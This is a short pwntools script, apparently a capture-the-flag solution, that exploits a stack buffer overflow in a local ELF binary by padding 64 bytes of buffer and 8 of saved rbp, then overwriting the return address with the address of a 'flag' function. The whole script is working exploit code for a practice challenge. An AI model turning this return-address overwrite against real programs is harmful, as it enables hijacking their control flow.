from pwn import *

gen_filename = ""

e = ELF(gen_filename)
p = e.process()

dest = e.symbols['flag']

payload = b''
payload += 64 * b'a'  # buffer
payload +=  8 * b'b'  # rbp
payload += p64(dest)  # rip
p.sendline(payload)

p.stream()

